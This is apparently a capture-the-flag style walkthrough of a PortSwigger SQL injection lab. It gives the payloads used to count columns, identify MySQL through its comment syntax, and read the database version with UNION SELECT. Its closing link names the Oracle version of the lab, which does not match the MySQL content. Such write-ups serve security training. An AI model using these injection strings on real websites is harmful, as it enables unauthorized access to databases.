# querying the database type and version on MySQL and Microsoft SQL Server

**STEP #1**

Determine the number of columns returned by the original query.

```text
' ORDER BY 1--                          → Returns an error message.
```

The original query must return at least one column. So the error might be in the comment. So let’s try out every possible comment syntax to find out the one that matches.

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/58df1bceb192_001.png)

```text
' ORDER BY 1#
```

Since the compatible comment syntax is `#`, database type must be `MySQL`.Therefore in further attack steps, you need to use `MySQL` syntax.

```text
' ORDER BY 2#
' ORDER BY 3# → Returns an error message "Internal Server Error".
```

**Therefore the number of columns returned by the original query is 2.**

**STEP #2**

Discover the column that has a data type string.

```text
' UNION SELECT 'a', NULL#
```

```text
' UNION SELECT 'a', 'a'#
```

```text
' UNION SELECT 'a', NULL#             → Returns 200 status code
' UNION SELECT 'a', 'a'#              → Returns 200 status code
```

**Therefore column 1 and 2 both contain data type string.**

We can use either column 1 or 2 to retrieve database version.

**STEP #3**

Querying the database to retrieve database version.

```text
' UNION SELECT @@version , NULL#
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/Examining_the_database_in_SQL_injection_attacks./images/58df1bceb192_002.png)

## PortSwigger Lab

**Official lab:** SQL injection attack, querying the database type and version on Oracle

**PortSwigger:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
